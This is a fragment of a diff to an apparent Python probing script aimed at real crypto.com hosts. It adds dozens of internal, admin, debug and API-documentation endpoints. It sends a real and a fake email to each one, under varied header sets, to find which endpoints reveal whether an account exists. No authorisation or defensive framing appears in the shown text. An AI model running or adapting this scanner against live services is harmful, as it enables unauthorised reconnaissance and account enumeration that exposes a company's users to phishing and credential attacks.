+    ("/_internal/email/exists",        "GET",  None),
+    ("/_api/users/check",              "POST", {"email": REAL}),
+    ("/_api/users/exists",             "POST", {"email": REAL}),
+    ("/__internal/email/check",        "POST", {"email": REAL}),
+    ("/__internal/users/search",       "POST", {"query": REAL}),
+    ("/internal/users/check",          "POST", {"email": REAL}),
+    ("/internal/email/check",          "POST", {"email": REAL}),
+    ("/internal/v1/users/check",       "POST", {"email": REAL}),
+    ("/internal/v1/email/exists",      "POST", {"email": REAL}),
+    ("/admin/v1/users/search",         "POST", {"email": REAL}),
+    ("/admin/v1/users/check",          "POST", {"email": REAL}),
+    ("/admin/api/v1/users",            "GET",  None),
+    ("/admin/users",                   "GET",  None),
+    ("/debug/users",                   "GET",  None),
+    ("/debug/vars",                    "GET",  None),
+    ("/metrics",                       "GET",  None),
+    ("/healthz",                       "GET",  None),
+    ("/readyz",                        "GET",  None),
+    ("/api/admin/users/",              "GET",  None),
+    ("/api/admin/users/search/",       "GET",  None),
+    ("/management/users/check",        "POST", {"email": REAL}),
+    ("/management/accounts/search",    "GET",  None),
+    ("/openapi.json",                  "GET",  None),
+    ("/docs",                          "GET",  None),
+    ("/redoc",                         "GET",  None),
+    ("/v1/openapi.json",               "GET",  None),
+    ("/api/openapi.json",              "GET",  None),
+    ("/swagger-ui.html",               "GET",  None),
+    ("/v2/api-docs",                   "GET",  None),
+    ("/v3/api-docs",                   "GET",  None),
+    ("/api/v3/api-docs",               "GET",  None),
+    ("/api/v1/users/exists",           "GET",  None),
+    ("/api/v1/users/exist",            "GET",  None),
+    ("/api/v2/users/exists",           "GET",  None),
+    ("/api/v1/accounts/exists",        "GET",  None),
+    ("/api/v1/identity/check",         "POST", {"email": REAL}),
+    ("/api/v1/identity/exists",        "POST", {"email": REAL}),
+    ("/api/v1/profile/exists",         "POST", {"email": REAL}),
+    ("/service/user/check",            "POST", {"email": REAL}),
+    ("/service/account/check",         "POST", {"email": REAL}),
+    ("/ms/user/check",                 "POST", {"email": REAL}),
+    ("/ms/users/exists",               "GET",  None),
+    ("/microservice/users/check",      "POST", {"email": REAL}),
+    ("/robots.txt",                    "GET",  None),
+    ("/sitemap.xml",                   "GET",  None),
+    ("/api/v1/utils/check-email",      "POST", {"email": REAL}),
+    ("/api/v1/utils/email-exists",     "POST", {"email": REAL}),
+    ("/util/email/check",              "POST", {"email": REAL}),
+    ("/tools/email/check",             "POST", {"email": REAL}),
 ]
 
 INTERNAL_BASES = [
-    "https://crypto.com", "https://api.crypto.com", "https://exchange.crypto.com",
-    "https://pay.crypto.com", "https://nft.crypto.com",
-    "https://chat.crypto.com", "https://alfred-gateway.crypto.com",
+    "https://crypto.com",
+    "https://api.crypto.com",
+    "https://exchange.crypto.com",
+    "https://pay.crypto.com",
+    "https://nft.crypto.com",
+    "https://chat.crypto.com",
+    "https://alfred-gateway.crypto.com",
 ]
 
 def probe_internal(base, path, method, body_r, hdrs_extra):
@@ -753,6 +955,7 @@ def probe_internal(base, path, method, body_r, hdrs_extra):
     body_f = None
     if body_r:
         body_f = {k: (FAKE if v == REAL else v) for k, v in body_r.items()}
+
     if method == "GET":
         rr = do_get(full+"?email="+REAL, orig, hdrs_extra)
         rf = do_get(full+"?email="+FAKE, orig, hdrs_extra)
@@ -772,8 +975,7 @@ for base in INTERNAL_BASES:
     for path, method, body_r in INTERNAL_PATHS:
         for hset in INTERNAL_HDRS_SETS:
             int_tasks.append((base, path, method, body_r, hset))
-        if any(k in path for k in ["actuator","openapi","api-docs","swagger",
-                                    "robots","sitemap","healthz","readyz","metrics","docs","redoc"]):
+        if any(k in path for k in ["actuator","openapi","api-docs","swagger","robots","sitemap","healthz","readyz","metrics","docs","redoc"]):
             int_tasks.append((base, path, method, body_r, {}))
 
 print(f"  queued {len(int_tasks)} internal probes ...")
